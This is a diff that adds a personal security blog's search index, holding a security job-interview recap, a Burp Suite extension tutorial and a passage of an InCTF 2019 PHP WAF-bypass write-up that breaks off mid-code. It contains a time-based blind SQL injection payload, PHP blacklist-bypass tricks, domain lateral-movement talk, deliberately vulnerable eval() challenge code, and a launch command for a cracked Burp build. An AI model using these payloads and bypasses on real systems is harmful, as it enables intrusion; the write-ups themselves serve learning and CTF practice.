@@ -1,0 +1,1400 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>58同城面试总结</title>
+    <url>/2021/10/03/58%E5%90%8C%E5%9F%8E%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="1-你先做个自我介绍吧"><a href="#1-你先做个自我介绍吧" class="headerlink" title="1. 你先做个自我介绍吧"></a>1. 你先做个自我介绍吧</h2><h2 id="2-假如说有个SQL注入如下"><a href="#2-假如说有个SQL注入如下" class="headerlink" title="2. 假如说有个SQL注入如下"></a>2. 假如说有个SQL注入如下</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> userid <span class="operator">=</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>response里面没有返回内容</li>
+<li>1s就超时了，直接返回404页面</li>
+</ol>
+<p><strong>这种情况下如何注入?</strong></p>
+<p>我: 我没有更好的思路了<br>面试官: 这个时间盲注1s钟嘛,可以用更小单位一点的</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> userid <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">0.0</span><span class="number">.1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>即使sleep很小一个值, 如果user表够大的话, 还是会超时</p>
+<p>所以可以用一些嵌套查询的方式去做, if语句之类的</p>
+<h2 id="3-比如说我写一个安全SDK"><a href="#3-比如说我写一个安全SDK" class="headerlink" title="3. 比如说我写一个安全SDK"></a>3. 比如说我写一个安全SDK</h2><p><strong>1. sql注入的修复, 怎么写(伪代码)</strong></p>
+<p>我: 我倾向于使用预编译的方式<br>面试官: 但是预编译的话, 研发可能不会用怎么办呢, 就是说如果他觉得改起来太麻烦了能不能更方便一点. 因为预编译的话, 我每条SQL每条查询都得去改.</p>
+<p>我: 那设计一个白名单怎么样呢<br>面试官: 那你大概写一下怎样设计一个白名单. 你可以分场景, 比如说什么场景什么场景的SQL注入, 或者是参数里面应该做什么操作</p>
+<p><strong>2. xss的修复, 怎么写(伪代码)</strong><br>我: 用实体化转义<br>面试官: 但是我们有一个场景啊, 你看我们上传简历这里, 有时候会支持上传html的简历, 对吧. 他本身业务就需要用到html, 如果用html实体化转义的话, 他全都会被转义, 那这样的话业务就崩了嘛, 对不对. 那这种情况下我们要怎么样去写一个xss的过滤, 或者是说转义, 去解决这个类似于简历这个场景. 你可以想一想, 写不出来代码也没关系.</p>
+<p>我: 白名单限制, 黑名单过滤.<br>面试官: 其实我们自己是这样做的, 对于这种情况, 我们第一是会做一个html标签的白名单, 第二是事件的白名单. 黑名单我们就不搞了.</p>
+<p><strong>3. rce的修复, 怎么写(伪代码)(java或者python的命令执行)</strong><br>我: 白名单限制, 只允许需要的函数. 但RCE的话我感觉在业务场景当中, 一般来说也不是很容易出现<br>面试官: 欸, 我们就出现了很多. 尤其是运维部门.</p>
+<p>我: 我打CTF比较多, 我了解的RCE都是PHP方面的. 比如说system, popen之类的. 一般来说都是直接做过滤<br>面试官: 那PHP中这些函数全部被黑名单了, 你还有什么方法</p>
+<p>我: 字符串拼接 <code>$a=p.h.p.i.n.f.o()</code><br>面试官: 你有没有用过php里面的反引号啊</p>
+<p>我: 还有用 <code>chr()</code> 函数来绕过<br>面试官: 编码是吧</p>
+<p><strong>4. xxe的修复, 怎么写(伪代码)</strong><br>我: 对XXE来说, 我只了解他的攻击方式, 对他的防御不是很了解. 攻击方式就是做XML的外部实体化注入. 一个攻击模板, 可以读文件, 可以做命令执行<br>面试官: XXE怎么做命令执行呢, 就拿php来说, XXE怎么做命令执行</p>
+<p>我: emmmm, 这个想不起来了<br>面试官: XXE这个命令执行是要他的服务端本身支持某些特殊的协议, 一般来说是不行的</p>
+<h2 id="4-了解过自动化代码审计的工具吗-类似于fortify这种"><a href="#4-了解过自动化代码审计的工具吗-类似于fortify这种" class="headerlink" title="4. 了解过自动化代码审计的工具吗, 类似于fortify这种"></a>4. 了解过自动化代码审计的工具吗, 类似于fortify这种</h2><p>我: 我只用过那个一个比较老的那个, 我想不起来了(指seay)<br>面试官: 没关系, 那你有没有了解过他的一些原理, 大概怎么做的</p>
+<p>我: 他原理一般都是通过匹配一些特殊函数, 去定位可能出现漏洞的函数的位置<br>面试官: 但这种的话他误报很高欸, 就像我这种RCE的话, 你直接匹配的话他很多都是误报了, 很多他都不是web思路的</p>
+<p>我: 还有一种是, 给他加一些自定义规则<br>面试官: 那有没有更好的办法呢, 误报太多了我们没办法接受啊</p>
+<p>我: 我有一个想法就是, 他自己匹配了之后, 能不能从前端从一个黑盒的层面再去验证一遍<br>面试官: 那黑盒验证, 我就有需求是, 首先我得知道, 首先我php里面我这个函数到底是哪个入口传进来的, 对吧. 但这个有可能经过了层层调用, 甚至有可能是<code>include()</code>这种, 那这种的话, 对于我来说 , 我并不知道他影响到了哪一些入口, 这种情况怎么办呢</p>
+<p>我: 巴拉巴拉阿巴阿巴<br>面试官: emm那个, 你们学校有学编译原理吗</p>
+<p>我: 额, 没有<br>面试官: 那, 那可以理解了. 但是其实我觉得安全专业还是要学一下编译原理</p>
+<p>面试官: 其实是这样的, 我们也会自建这种自动化代码审计工具嘛, 他大概是什么原理呢, 因为我们做的是java的, 他是在java编译的过程中, 他会去搜集他的编译的过程信息, 比如说他类与类之间的关系. 然后他会有一个3d字码这样的东西, 他会更贴近于机器码, 他就不是java的AST啊这种. 3d字码对应的每一个函数和方法之间的引用, 或者是每个java文件和java文件之间的引用, class和class之间的关系, 他会组成一张很大的图, 这样的话你有一个这样很大的图的话, 你再去看哪些是满足参数是外部输入的, 以及他哪一些比如说像, 他这是一个污点分析的模型嘛, 他有个source think join函数这么一个模型, 当这两点存在一个通路的时候, 我们就认为他这两点存在一个漏洞, 那这样的话其实他精度就非常高了, 这是跟他的代码的数据流相关的, 他数据流存在, 我才认为他是有问题的, 比那种正则匹配的精度会高非常多. 主要原理就是编译原理中, 在他的编译过程中收集源代码信息. PHP也能做, 可以通过他的AST语法树去做, 因为PHP是边运行的时候边编译的. </p>
+<h2 id="5-有没有搞过linux的这种后渗透相关的"><a href="#5-有没有搞过linux的这种后渗透相关的" class="headerlink" title="5. 有没有搞过linux的这种后渗透相关的"></a>5. 有没有搞过linux的这种后渗透相关的</h2><p>面试官: 比如这个linux被我攻陷了, 我想去拿到更多的信息, 比如说一些横向的信息, 那种有没有搞过<br>我: 这种不是很了解, 但windows的会一点</p>
+<p>面试官: 那你可以简单讲一下, 比如你先攻陷一台windows的机器, 然后我想在这个windows的域内去做一些横向移动, 我想把这个windows的域的权限给拿到, 这种你该怎么做<br>我: 通过票据伪造, 白银票据和黄金票据<br>面试官: 你这个票据伪造要怎么做呢<br>我: 一般用mimikatz就可以了吧</p>
+<p>面试官: 你mimikatz抓取的是内存里面的密码和一些他的票据, 那我如果本身是低权限的呢, 就我本身抓不了密码, 或者我抓到的用户密码并不是域账号的, 是一个低权限账号呢. 因为大部分渗透进来都是个应用, 应用他可能并没有域权限<br>我: 从低权限往上提</p>
+<p>面试官: 那你一般会怎么提权<br>我: 一般windows的漏洞吧<br>面试官: 那现在就用这个windows系统的提权, 我现在就一个webshell, 那我怎么样去提权</p>
+<p>面试官: 你可以这样嘛, 你上传一个提权的脚本或者exe嘛, 你webshell去跑这个exe, 他就把这个web应用权限提权了</p>
+<h2 id="6-那你最后有什么想问我的吗"><a href="#6-那你最后有什么想问我的吗" class="headerlink" title="6. 那你最后有什么想问我的吗"></a>6. 那你最后有什么想问我的吗</h2><p>我: 我想问一下, java的业务, 做java安全大概是怎样的一个思路</p>
+<p>面试官: java安全分甲方和乙方,<br>甲方的话其实他更多的是一些正向的建设, 就是说我怎样去保证整个甲方的应用安全, 那我们这边其实是分了好几块, </p>
+<ul>
+<li>一块是我们黑盒扫描器, 就类似于AWVS这种, 我们会把我们的整个镜像流量镜像下来, 然后把cookie去掉或者替换成自己扫描器的cookie去进行一个扫描. </li>
+<li>第二种是我们会去做一个白盒扫描器, 我们会根据这个污点分析的逻辑去做这个漏洞的扫描. </li>
+<li>第三个就是我们会有一个java agent, 他会去动态的捕捉, 比如说测试环境里面, 我们就会去把他很多比如说request方法, system方法, runtime, exec… 等等这种我们认为是危险的, 甚至说是入口函数的, 全部破坏掉. 配合我们的黑盒, 以及它本身的流量, 因为他本身的流量是满足这么一个污点分析的过程的, 这样我们可以去把他的漏洞给找出来. </li>
+<li>最后一步呢, 就是我们会去结合这个IDS或者是HIDS, 我们去在这个线上应用里面去插一个ISP, 这样就可以补充流量里面 (如果没有ISP, 我们整个反入侵是缺少应用内信息的, 我们只有流量信息和主机里面的一些行为, 他缺少应用内行为) 我如果我在ISP里面插入java agent, 去hook他的危险函数, 那我其实可以把他的每条流量, 应用里面发现了什么, 他的堆栈信息是怎么样的, 到了主机层他又发生了什么事情, 全部串联起来. 那我可以完成一个一条流量的完整攻击链路. 可能会比较贴近各个领域的需求吧, 比如说RST, 我们可能认为是个反入侵的技术, 其实本质上还是java安全. </li>
+</ul>
+<p>乙方的话我认为比较偏向一个java漏洞的利用和研究和攻击吧, 以及他的java漏洞的后渗透, 比如我有一个seiruo. 我怎样能很快的发现这个问题, 以及怎样去获取到持久化的权限, 怎么样一键的去维持这样的权限, 怎么样去横向扩展, 以及攻击思路自动化的这种需求</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BurpSuit 插件开发（一）</title>
+    <url>/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><ol>
+<li>burp官方支持三种语言开发插件：Java、Python、Ruby。但一般情况下推荐使用Java来做插件开发。原因有以下两点：<ol>
+<li>当用python去做插件的时候，如果需要使用到某个库，而这个库又是用C语言实现的。那么插件将无法正常运行。因为burp在执行python写的插件的时候，是通过Jython（Jython是一种完整的语言，而不是一个Java翻译器或仅仅是一个Python编译器，它是一个Python语言在Java中的完全实现。）去解析执行的。而Jython是无法使用C写的模块，所以在这时候插件就不能正常运行。</li>
+<li>burp本身是Java写的，使用Java去开发插件兼容性最高，会少很多莫名其妙的错误。而且当使用Java的时候，可以很方便的和ide进行远程调试。而在使用python写插件进行调试时，只能尽量通过输出去获取信息，没有好的办法进行下断点的动态调试</li>
+</ol>
+</li>
+</ol>
+<p>  所以说Java是写插件的最优选择</p>
+<ol start="2">
+<li>回调的概念<br>我们所写的插件，都是被burp所调用的，实质上就是个回调<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""></li>
+</ol>
+<h2 id="二、入门准备"><a href="#二、入门准备" class="headerlink" title="二、入门准备"></a>二、入门准备</h2><ol>
+<li>在本文中是使用java来进行开发，所以主要讲一下java中的调试方法。其他语言就多写点print就可以了。</li>
+<li>由于国内大多数是用的破解版burp，所以在调试方法的准备上稍微需要一点改变。一般情况下破解版burp有使用helper的，有使用keygen的。而如果想要进入调试状态，则需要使用kygen。在我的调试环境下，有如下两个文件<ol>
+<li><strong>burp-loader-keygen.jar</strong></li>
+<li><strong>burpsuite_pro_v1.7.31.jar</strong></li>
+</ol>
+</li>
+</ol>
+<p>  用如下命令启动burp并让它处于调试的监听方：<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.31.jar</code>这个命令和调试正版burp的区别在于，这个命令需要加<code>-Xbootclasspath/p:burp-loader-keygen.jar</code>这一段。<br>  可以将这条指令保存为bat文件，方便一键启动。<br>3. 另一边就是IDE的配置了，以idea为例（注意jdk环境不能太高，否则你打包的jar包burp不能正常加载，推荐使用jdk1.8）</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class="">
+<p>如上debug模式的burp和IDEA都配置好后，就可以进行下断点调试了。需要注意的是，需要保持IDEA中的代码和你打包的插件的代码一致。</p>
+<ol start="4">
+<li>顺便在这里再码一篇写的很棒的文章 <a href="https://blog.netspi.com/debugging-burp-extensions/">https://blog.netspi.com/debugging-burp-extensions/</a><br>还有，官方资料都是最好的资料 <a href="https://portswigger.net/burp/extender#SampleExtensions">https://portswigger.net/burp/extender#SampleExtensions</a></li>
+</ol>
+<h2 id="三、Hello-World"><a href="#三、Hello-World" class="headerlink" title="三、Hello World"></a>三、Hello World</h2><ol>
+<li>首先我们创建一个IDEA工程文件，并且创建一个名叫burp的包。然后启动之前准备好的bat文件。并将burp里面的API接口文件导出到IDEA的burp包里面。再之后，新建一个class文件，名字为BurpExtender。然后写入以下代码。<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> burp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// implements IBurpExtender</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set our extension name</span></span><br><span class="line">        callbacks.setExtensionName(<span class="string">&quot;Hello world extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// obtain our output and error streams</span></span><br><span class="line">        PrintWriter stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</span><br><span class="line">        PrintWriter stderr = <span class="keyword">new</span> PrintWriter(callbacks.getStderr(), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        stdout.println(<span class="string">&quot;This is output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our error stream</span></span><br><span class="line">        stderr.println(<span class="string">&quot;This is errors&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to the Burp alerts tab</span></span><br><span class="line">        callbacks.issueAlert(<span class="string">&quot;Hello alerts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// throw an exception that will appear in our error stream</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;Hello exception&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将项目打包为jar包然后从burp导入jar包</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/5.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/7.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/8.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/9.png" class="">
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/10.png" class="">
+
+<p>最后成功输出结果</p>
+<img src="/2021/08/27/BurpSuit-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89/11.png" class="">
+]]></content>
+      <categories>
+        <category>安全开发</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>Burp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP协议</title>
+    <url>/2021/08/24/HTTP%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p>一些基础知识</p>
+<p>绕过CDN查找真实IP地址</p>
+]]></content>
+      <categories>
+        <category>协议相关</category>
+      </categories>
+      <tags>
+        <tag>HTTP</tag>
+        <tag>DNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>InCTF 2019 - （PHP + 1, PHP + 1.5 and PHP + 2.5）三道题的复现</title>
+    <url>/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这篇writeup是关于这次比赛 <code>PHP+1</code>, <code>PHP+1.5</code>和<code>PHP+2.5</code>这三道代码审计题目的。我们可以用同一个payload来解决这三道题目。这三道题的考点是全部相同的: <strong>Bypass the WAF and get a shell</strong></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先看第一道题（PHP+1），打开题目链接就能直接获取到题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP+1</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面的代码简单来说就是，我们需要传入两个参数：<code>input</code>和<code>thisfile</code>。<br>对于参数<code>thisfile</code>我们可以给它传入一个目录路径来绕过<code>is_file</code>，<code>file_existes</code>这两个函数的检测。<br>绕过这两个函数的检测之后，接下来我们要想办法绕过<code>check</code>函数，这个函数将获取所有PHP的系统内置函数，并检查我们的输入是否含有这些系统内置函数。如果检测到输入了系统内置函数，那么就会被check。</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/1.png" class="">
+
+<p>下一道题（PHP+1.5），同样直接打开题目链接就能获取到题目源码，源码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php+1.5</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/i&quot;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you really you need that?&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题和之前那道题的不同点在于，我们的输入会再被参数<code>blacklist</code>过滤一遍。所以在上一道题甚至可以用<code>eval</code>去执行一些代码。因为<code>eval</code>并不是一个函数，详情见PHP手册英文版（中文版翻译有误差）。PHP手册中写到<code>eval</code>是一个<code>language construct</code>。进一步查询可以知道，在PHP中有很多<code>words</code>都是<code>language construct</code></p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/2.png" class="">
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/3.png" class="">
+
+<p>最后再来观察第三道题（PHP+2.5），源码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP+2.5</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$blacklisted</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blacklisted</span> . <span class="string">&#x27;/im&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your input is blacklisted&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\&quot;|\&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/i&quot;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you really you need that?&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$blacklist</span>);</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$input</span>) &gt; <span class="number">100</span>) &#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is getting really large input...&quot;</span> . <span 